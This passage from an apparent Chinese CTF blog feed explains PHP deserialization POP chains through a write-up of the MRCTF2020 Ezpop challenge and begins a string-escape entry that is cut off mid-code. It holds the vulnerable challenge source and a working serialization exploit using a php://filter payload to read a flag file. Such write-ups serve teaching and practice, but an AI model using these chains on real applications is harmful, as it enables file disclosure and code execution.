g.txt’的长度为24（长度就是固定的那部分），已知数据data为scan，额外添加数据为read<br><img src="/images/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/4.png"><br><img src="/images/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/5.png"></p><hr><p>参考链接：</p><ul><li><a href="https://blog.csdn.net/crisprx/article/details/104349608">https://blog.csdn.net/crisprx/article/details/104349608</a></li><li><a href="https://blog.csdn.net/plant1234/article/details/123999788">https://blog.csdn.net/plant1234/article/details/123999788</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化之pop链构造</title>
      <link href="/2023/07/28/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bpop%E9%93%BE%E6%9E%84%E9%80%A0/"/>
      <url>/2023/07/28/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bpop%E9%93%BE%E6%9E%84%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="php反序列化之pop链"><a href="#php反序列化之pop链" class="headerlink" title="php反序列化之pop链"></a>php反序列化之pop链</h1><hr><h2 id="pop链介绍"><a href="#pop链介绍" class="headerlink" title="pop链介绍"></a>pop链介绍</h2><hr><ul><li>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的</li></ul><p>说的再具体一点就是 ROP 是通过栈溢出实现控制指令的执行流程，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。</p><h2 id="pop链常见函数："><a href="#pop链常见函数：" class="headerlink" title="pop链常见函数："></a>pop链常见函数：</h2><h3 id="反序列化的常见起点："><a href="#反序列化的常见起点：" class="headerlink" title="反序列化的常见起点："></a>反序列化的常见起点：</h3><pre class="line-numbers language-none"><code class="language-none">__wakeup 一定会调用__destruct 一定会调用__toString 当一个对象被反序列化后又被当做字符串使用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="反序列化的常见中间跳板"><a href="#反序列化的常见中间跳板" class="headerlink" title="反序列化的常见中间跳板:"></a>反序列化的常见中间跳板:</h3><pre class="line-numbers language-none"><code class="language-none">__toString 当一个对象被当做字符串使用__get 读取不可访问或不存在属性时被调用__set 当给不可访问或不存在属性赋值时被调用__isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this-&gt;$func();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="反序列化的常见终点"><a href="#反序列化的常见终点" class="headerlink" title="反序列化的常见终点:"></a>反序列化的常见终点:</h3><pre class="line-numbers language-none"><code class="language-none">__call 调用不可访问或不存在的方法时被调用call_user_func 一般php代码执行都会选择这里call_user_func_array 一般php代码执行都会选择这里<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="MRCTF2020-Ezpop-1"><a href="#MRCTF2020-Ezpop-1" class="headerlink" title="[MRCTF2020]Ezpop 1"></a>[MRCTF2020]Ezpop 1</h3><ul><li>ps：一个比较简单的pop题目</li></ul><hr><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag is in flag.php</span><span class="token comment">//WTF IS THIS?</span><span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h4 id="源码分析："><a href="#源码分析：" class="headerlink" title="源码分析："></a>源码分析：</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在传入参数pop被设置时对其进行反序列化，那么再查看此前定义的类中哪些具有和反序列化相关的魔术方法，调用这些魔术方法中设置的代码，就可以执行此处反序列化之外更多的代码，从而实现我们读取flag.php中flag的要求。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Modifier类中append()方法会将传入参数包含，而此处魔术方法__invoke中设置了将Modifier类中的var属性作为传入值来调用append()函数，所以在这里需要让属性var的值为flag.php，再触发魔术方法__invoke即可。魔术方法__invoke被自动调用的条件是类被当成一个函数被调用，故接着来寻找和函数调用有关的代码。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在Test类中有两个魔法函数__construct和__get，但魔法函数__construct这里用不上只需要关注魔法函数__get就好。魔法函数__get中设置了属性p会被当做函数调用，刚好符合前面Modifier类中的要求。故需要再触发魔法函数__get即可，魔法函数__get会在访问类中一个不存在的属性时自动调用，那就需要寻找和调用属性相关的代码。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Show类中有三个魔术方法，同样魔术方法__construct这里也用不上，在魔术方法__toString中会返回属性str中的属性source，如果刚刚提到的source属性不存在，那么就符合了Test类中的要求，那这里。魔术方法__toString在类被当做一个字符串处理时会被自动调用，在魔术方法__wakeup则将属性source传入正则匹配函数preg_match()，在这个函数中source属性就被当做字符串处理。最终这个魔术方法__wakeup又在类被反序列化时自动调用。这样从Test类中append()方法到Show类中的魔术方法__wakup就形成了一条调用链，这就是POP的一个使用样例，而题目——Ezpop就说明了这题设计的知识。</p><ul><li>综上所述，一次经历了如下过程：<br>反序列化-&gt;调用Show类中魔术方法__wakeup-&gt;preg_match()函数对Show类的属性source处理-&gt;调用Show类中魔术方法__toString-&gt;返回Show类的属性str中的属性source(此时这里属性source并不存在)-&gt;调用Test类中魔术方法__get-&gt;返回Test类的属性p的函数调用结果-&gt;调用Modifier类中魔术方法__invoke-&gt;include()函数包含目标文件(flag.php)</li></ul><p>给出序列化脚本：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token property">p</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="小小tip"><a href="#小小tip" class="headerlink" title="小小tip"></a>小小tip</h4><h5 id="问题一："><a href="#问题一：" class="headerlink" title="问题一："></a>问题一：</h5><p>做这题时想了挺久，开始一直没有弄明白为什么要a，b分别等于show对象，并且要$a-&gt;source&#x3D;$b？</p><ul><li>虽然preg_match()函数会对Show类的属性source处理，并且把source当做字符串处理，但是想要调用__tostring函数首先source属性得是一个对象，然后这个对象被当作string处理了</li></ul><h5 id="问题二："><a href="#问题二：" class="headerlink" title="问题二："></a>问题二：</h5><p>为什么是$b-&gt;str&#x3D;new Show()?</p><ul><li>__tostring函数的本意是：规定当对象被当作string时，<strong>这个对象</strong>将会被怎样处理，也就是说$b虽然是$a对象的source属性，但不是$a对象的__tostring函数对$b进行操作，而是$b本身自己的__tostring函数会被调用,同理后面的__invoke函数也是这个原理</li></ul><hr><p><strong>参考文章：</strong></p><ul><li><a href="https://www.cnblogs.com/Article-kelp/p/14657419.html">https://www.cnblogs.com/Article-kelp/p/14657419.html</a></li><li><a href="https://blog.csdn.net/weixin_45785288/article/details/109877324">https://blog.csdn.net/weixin_45785288/article/details/109877324</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化之字符逃逸</title>
      <link href="/2023/07/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"/>
      <url>/2023/07/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="反序列化之字符逃逸"><a href="#反序列化之字符逃逸" class="headerlink" title="反序列化之字符逃逸"></a>反序列化之字符逃逸</h1><hr><h2 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h2><p>因为序列化的字符串是严格的，对应的格式不能错，比如s:4:”name”,那s:4就必须有一个长度是4的字符串，没有就往后要。<br>并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。<br>例如：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#正规序列化的字符串</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a:2:&#123;s:3:\"one\";s:4:\"flag\";s:3:\"two\";s:4:\"test\";&#125;"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#带有多余的字符的字符串</span><span class="token variable">$a_laji</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a:2:&#123;s:3:\"one\";s:4:\"flag\";s:3:\"two\";s:4:\"test\";&#125;;s:3:\"真的垃圾img\";lajilaji"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a_laji</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>运行的结果都是<span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token string double-quoted-string">"one"</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"flag"</span>  <span class="token punctuation">[</span><span class="token string double-quoted-string">"two"</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安洵杯-2019-easy-serialize-php-1"><a href="#安洵杯-2019-easy-serialize-php-1" class="headerlink" title="[安洵杯 2019]easy_serialize_php 1"></a>[安洵杯 2019]easy_serialize_php 1</h2><hr><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token 